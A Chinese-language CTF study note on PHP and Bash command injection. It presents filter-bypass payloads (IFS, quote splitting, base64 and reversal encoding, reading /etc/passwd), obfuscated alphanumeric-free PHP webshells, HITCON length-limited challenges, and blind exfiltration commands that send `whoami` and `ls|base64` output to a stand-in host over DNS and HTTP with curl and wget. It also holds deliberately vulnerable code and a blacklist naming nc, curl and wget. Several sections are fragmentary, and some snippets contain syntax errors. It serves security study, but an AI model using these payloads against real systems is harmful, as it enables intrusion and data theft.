# 命令注入

> RCE，可以理解为远程代码执行（Remote Code Execution）或远程命令执行（Remote Command Execution）
>
> 代码执行与命令执行的区别？

?>在学习本节之前，建议先学习[Bash基础](Basic/Linux/Bash.md)

## 命令分隔符

|名称|例子|说明|
|---|---|---|
|;|`whoami;ls`|命令的结束符，使得一行可以放置多个命令，命令从左到右顺序执行，所有命令都会执行。Windows系统下命令提示符`cmd`无此语法|
|&&|`whoami&&ls`|逻辑与，只有第一条命令执行成功，才会执行第二条命令|
|\|\||`whoami\|\|ls`|逻辑或，只有第一条命令执行失败，才会执行第二条命令|
|\|||管道符，两条命令都执行，其中第一条命令的输出作为第二条命令的输入，即不显示第一条命令的输出|
|&||后台执行，两条命令都执行|
|%0A||PHP环境下|


输入输出重定向

`$(ls)`
ls${}${IFS}id


变量
模式扩展
- 花括号扩展
输出重定向

`command > file	`，将输出重定向到file 


## 转义字符

Bash转义字符反斜杠`\`。

换行符是一个特殊字符，表示命令的结束，Bash收到这个字符以后，就会对输入的命令进行解释执行。换行符前面加上反斜杠转义，就使得换行符变成一个普通字符，Bash会将其当作长度为0的空字符处理，从而可以将一行命令写成多行。

PHP中的[escapeshellcmd()](https://www.php.net/manual/zh/function.escapeshellcmd.php)对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。可以使用换行符构造多行命令。



## Linux下的与文件相关命令

- 列目录、文件

```
/ls|dir/
```

- 读文件

```
/cat|tac|tail|head|more|less|uniq|strings|sort|/
```

```
if (!preg_match('/|dir|nl|nc||flag|sh|cut|awk||od|curl|ping|\*||ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo||cc||\.|{|}|tar|zip|gcc||vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
        echo "11";
        echo system($cmd);
  }
```

## PHP的命令执行相关函数

|函数名称|说明|
|--|--|
|[system()](https://www.php.net/manual/zh/function.system.php)|执行外部程序，成功则返回命令输出的最后一行，失败则返回 false。**显示输出**|
|[exec()](https://www.php.net/manual/zh/function.exec.php)|执行一个外部程序，**返回**命令执行结果的最后一行内容|
|[shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)|通过 shell 执行命令并将完整的输出以字符串的方式**返回**|
|``[反引号](https://www.php.net/manual/zh/language.operators.execution.php)|将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，与函数 shell_exec() 相同|
|[passthru()](https://www.php.net/manual/zh/function.passthru.php)|执行外部程序并且**显示原始输出**|
|[pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)|在当前进程空间执行指定程序|
|popen()||
|[proc_open()](https://www.php.net/manual/zh/function.proc-open.php)|执行一个命令，并且打开用来输入/输出的文件指针。|
|pcntl_exec()||

- [system()](https://www.php.net/manual/zh/function.system.php) 执行外部程序，并且显示输出

成功则返回命令输出的最后一行，失败则返回`false`;并且**显示输出**。

```php
<?php 
system('whoami'); // root
echo system('whoami');
/*
 * root
 * root
 * 会输出两个结果，注意，第二个输出为返回值，仅为最后一行
 */
```

- [exec()](https://www.php.net/manual/zh/function.exec.php)

执行一个外部程序，**返回**命令执行结果的最后一行内容

```php
exec('whoami'); // 无任何输出
var_dump(exec('whoami'));  // string(4) "root"，输出最后一行内容
```

- [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 通过 shell 执行命令并将**完整的输出以字符串的方式返回**

```php
shell_exec('whoami'); // 无任何输出
var_dump(shell_exec('whoami'));
/*
 * string(5) "root
 * "
 * 原始输出，换行符
 */
```

- ``[反引号](https://www.php.net/manual/zh/language.operators.execution.php)

执行运算符，将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，**与函数 shell_exec() 相同**

```php
`whoami`; // 无任何输出
var_dump(`whoami`);
/*
 * string(5) "root
 * "
 * 原始输出，换行符
 */
```

- [passthru()](https://www.php.net/manual/zh/function.passthru.php) 执行外部程序并且显示**原始**输出

成功时返回 null， 或者在失败时返回 false。
```php
passthru('whoami'); // root
var_dump(passthru('whoami'));
/*
 * root
 * NULL 
 */
```

- [pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)  在当前进程空间执行指定程序

```php
pcntl_exec("/bin/bash",array($_POST["cmd"]));
pcntl_exec("/bin/bash",array('whoami'));
```

- [popen](https://www.php.net/manual/zh/function.popen.php) 打开进程文件指针
- [proc_open()](https://www.php.net/manual/zh/function.proc-open.php)  执行一个命令，并且打开用来输入/输出的文件指针。

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
   2 => array("file", "/tmp/error-output.txt", "a") // 标准错误，写入到一个文件
);

echo proc_open('whoami', $descriptorspec, $pipes);

```
可以赋给一个变量而不是简单地丢弃到标准输出

## 绕过技巧

<style>
  .markmap {
    width: 100%;
    height: 500px;
  }
</style>

```markmap
# RCE绕过技巧

## 绕过空格
- IFS
- {}
- 十六进制
## 绕过黑名单
- 字符类
	- 单引号、双引号
	- 反引号
	- 转义字符
- 变量
	- 变量拼接
	- 未初始化的变量
- 编码转换
	- Base64
	- 十六进制
	- 大小写
	- 逆序
- 模式扩展
## 长度限制绕过
- 五字符
- 四字符
## 无数字字母
 - 123

## 无回显
- 反弹shell
- DNS信道
- HTTP信道
```

### 绕过空格

```php
<?php
highlight_file(__FILE__);

$cmd = str_replace(" ", "", $_GET['cmd'];
echo "CMD: " . $cmd . PHP_EOL;
exec($cmd);
```

- `$IFS`、`${IFS}`、`$IFS$9`

环境变量IFS（**I**nternal **F**ield **S**eparator，内部字段分隔符），默认情况下由`空格`、`制表符`和`换行符`组成，可通过`set`命令查看。

`${IFS}`使用`{}`可以避免出现变量名与其他字符连用的情况。`$9`是当前命令的第9个参数，通常为空。习惯上，使用`$IFS$9`可避免避免变量名连用，也不出现花括号。


```bash
cat$IFS/etc/passwd
cat${IFS}flag
cat$IFS$9flag
```

- [大括号扩展](https://wangdoc.com/bash/expansion#%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95)`{...}`

```bash
{cat,/etc/passwd}
```

- 重定向运算符

```bash
# 输入重定向
cat</etc/passwd

# 读写
cat<>/etc/passwd
```

- `$'string'`特殊类型的单引号（ANSI-C Quoting）

`$''`属于[特殊的单引号](https://www.gnu.org/software/bash/manual/bash.html#ANSI_002dC-Quoting)，支持转义字符。

```bash
# 十六进制
X=$'cat\x20/etc/passwd';$X

# 换行符
x=$'cat\n/etc/passwd';$x
x=$'cat\t/etc/passwd';$x
```

- 使用制表符

```bash
;ls%09-al%09/home
```

- 变量截取
  
### 绕过黑名单

- 单引号

```bash
w'h'o'am'i
wh''oami
```

- 双引号

```bash
w"h"o"am"i
wh""oami
```

- 反引号\`

```bash
wh``oami
```

- 反斜线`\`（转义字符）

```bash
wh\oami

```

转义字符可以和换行符连用，实现命令续行，URL编码的示例如下：
```
ca%5C%0At%20/et%5C%0Ac/pa%5C%0Asswd
```
- 变量

```bash
# 变量拼接
a=f;b=lag;cat $a$b # cat flag

# 未初始化的变量，等价于null
ca${u}t f${u}lag
```

- 编码转换

```bash
# base64
echo "d2hvYW1pCg=="|base64 -d|sh # whoami
echo "d2hvYW1pCg=="|base64 -d|$0 # whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# 逆序
$(rev<<<'imaohw') # whoami

# 大小写
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

# 十六进制

```

- 模式扩展

```bash
# 通配符`?`代表任意单个字符，不包括空字符，如果匹配多个字符，需要多个`?`连用
cat fla?
cat fl??

# 通配符`*`代表任意数量的任意字符，包括零个字符
cat f*

# 方括号扩展[]
cat [f]lag

# 花括号扩展{}
cat {f,}lag

# 子命令扩展

cat /fla$(u)g
cat /fla`u`g
```



- 位置参数的特殊变量`$@`和`$*`  

`$@`和`$*`代表全部的位置参数，当没有位置参数时，扩展为空。如，``

```bash
who$@ami
who$*ami
```

### 绕过管道符`|`

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### 反斜杠`\`和斜杠`/`绕过

```bash
# ${varname:offset:length} 子字符串
cat ${HOME:0:1}etc${HOME:0:1}passwd

# d
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### 绕过IP限制

```bash
127.0.0.1 == 2130706433
```

### 绕过长度限制

```
<?=`$_GET[1]`;
<? `$_GET[1]`;


<?php
highlight(__FILE__);

$code = $_GET['code'];
if(strlen($code)<=1) {
	eval("?>".$code)
}



任意代码执行，13-14

蚁剑插件 提权 绕过disable_functions

disable_functions openbasedir

$_GET[1]
```
从代码执行到命令执行
https://r0yanx.com/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/

代码执行`eval()`参数限制在16个字符

```php
<?php
$param = $_REQUEST['param'];
if((strlen($param) < 17)) {
	eval($param);
}
eval('`$_GET[_]`;');
eval('exec($_GET[_]);');

eval('?><?=`$_GET[_]`;');
include$_GET[1];
include$_GET[1];&1=php://filter/read/convert.base64-decode/resource=N

usort(...$_GET);
1[]=test&1[]=phpinfo();&2=assert
```





https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html
最短的传参`$_GET[_]`，长度8位；9
<?=`$_GET[_]` 13位

```php
?><?=`$_GET[_]`； 16位
echo `$_GET[_]`； 16位
exec($_GET[_]); //15 无回显
eval($_GET[_]); // 15
5+10=15
exec 10
system()

```
#### 15位


- 命令执行5位 （HITCON 2017 Quals Babyfirst Revenge）

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
	@exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
	@exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
```
 
- 命令执行4位（HITCON 2017 Quals Babyfirst Revenge v2）

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
	@exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
	@exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
```

### 无字母数字

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
```

将非字母、数字的字符经过各种变换，构造出字母、数字，进而得到函数名，结合PHP动态函数的特点，达到执行代码的目的。

PHP 7引入了抽象语法树（AST），与PHP 5在[关于间接使用变量、属性和方法的变化](https://www.php.net/manual/zh/migration70.incompatible.php)。特别说明的是，PHP 7支持`'phpinfo'()`、`('phpinfo')()`。

- 按位异或XOR`^`

[PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位异或`，如`$a ^ $b`，当两个操作对象**都是字符串**时，将对会组成字符串的字符ASCII值执行操作，结果也是一个字符串。按位异或的规则是`相同为0，不同为1`。

```php
<?php
echo 0^0; // 0
echo 0^1; // 1
echo 1^1; // 0
echo 1^0; // 1

echo urlencode('a'^'a'); // %00
echo urlencode('a'^'b'); // %03
```

我们可以通过

```php
<?php
$myfile = fopen("xor_rce.txt", "w");
$contents = "";
for ($i = 0; $i < 256; $i++) {
	for ($j = 0; $j < 256; $j++) {

		if ($i < 16) {
			$hex_i = '0'.dechex($i);
		} else {
			$hex_i = dechex($i);
		}
		if ($j < 16) {
			$hex_j = '0'.dechex($j);
		} else {
			$hex_j = dechex($j);
		}
		$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
		if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) {
			echo "";
		} else {
			$a = '%'.$hex_i;
			$b = '%'.$hex_j;
			$c = (urldecode($a)^urldecode($b));
			if (ord($c) >= 32&ord($c) <= 126) {
				$contents = $contents.$c." ".$a." ".$b."\n";
			}
		}
	}
}
fwrite($myfile, $contents);
fclose($myfile);
```

简易payload如下：

```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```

- 按位取反Not`~`

[PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位取反`，如`~ $a`，将$a中为0的位设为1，反之亦然。如果操作对象是字符串，则将对组成字符串的字符 ASCII 值进行取反操作，结果将会是字符串。

通过调用代码执行函数，如`assert`，获得`webshell`，代码如下：

```php
<?php
/*
 * echo urlencode(~'assert'); // %9E%8C%8C%9A%8D%8B
 * echo urlencode(~'_POST');  // %A0%AF%B0%AC%AB
 */

// assert($_POST[_]);
// 支持PHP5和PHP7
$_=~'%9E%8C%8C%9A%8D%8B';$__=~'%A0%AF%B0%AC%AB';$__=$$__;$_($__[_]);

// $_=~'%A0%AF%B0%AC%AB';$_=$$_;(~'%9E%8C%8C%9A%8D%8B')($_[_]);
```



- 自增

PHP支持[PERL字符串递增功能](https://www.php.net/manual/zh/language.operators.increment.php)，该字符串必须是字母数字 ASCII 字符串。当到达字母 Z 且递增到下个字母时，将进位到左侧值。例如，$a = 'Z'; $a++;将 $a 变为 'AA'。

!> 自 PHP 8.3.0 起，此功能已软弃用。应该使用 str_increment() 函数。

```php
// ASSERT($_POST[_]);
// 由于payload中存在加号+，使用时需要进行URL编码
$_=[].'';$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```
- 过滤`$`

过滤掉`$`，将无法构造变量。

在PHP7下，可以利用`('phpinfo')()`语法，生成执行单个命令的payload。

```php
<?php
$func = 'system';
$cmd = 'whoami';

// system('whoami');
// PHP 7!
echo '(~' . urlencode(~$func) . ')(~' . urlencode(~$cmd) . ');'; // (~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
```

```php
?><?=`. /???/????????[@-[]`;?>
```
- 过滤`_`
- 过滤`;`


https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

### `disable_function`绕过
### 无回显
- 反弹shell

https://your-shell.com/

- 结果写入文件，二次返回

主要利用是输出重定向符号`>`将标准输出重定向到`可写`、`可访问`的目录下。

```bash
# 将输出结果保存到当前目录下的1.txt文件
ls -al>1.txt
```

- DNS信道

利用DNS解析特殊构造的域名，通过查看DNS解析记录获得结果。平台有 [dnslog.cn](http://dnslog.cn/)、[https://requestrepo.com/](https://requestrepo.com/)

```bash
ping `whoami`.example.com
curl `whoami`.example.com
wget -O- `ls|base64`.example.com
```

- HTTP信道

利用HTTP协议，GET或POST请求，获取结果。通常，如果数据量大，通过POST方法。

[https://requestrepo.com/](https://requestrepo.com/)

```bash
# 通过URL传送
curl example.com/`whoami`
curl example.com/`ls|base64`
wget -O- example.com/`ls|base64`

# 通过POST
curl -X POST --data `ls|base64` example.com
wget --post-data "$(ls|base64)" -O- example.com
```

- 延时



### 无参数

```php
<?php
highlight_file(__FILE__);
// (?R) 递归语法
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
?>
```

`';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)`

正则表达式`[^\W]+\((?R)\)`匹配无参数的函数，如`a()`、`a(b())`等。

- https://xz.aliyun.com/t/10780

## 经典赛题分析


## 参考资料

- https://book.hacktricks.xyz/v/cn/linux-hardening/bypass-bash-restrictions
- https://github.com/PortSwigger/command-injection-attacker/blob/master/README.md

- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- https://cwe.mitre.org/data/definitions/77.html
- https://paper.seebug.org/164/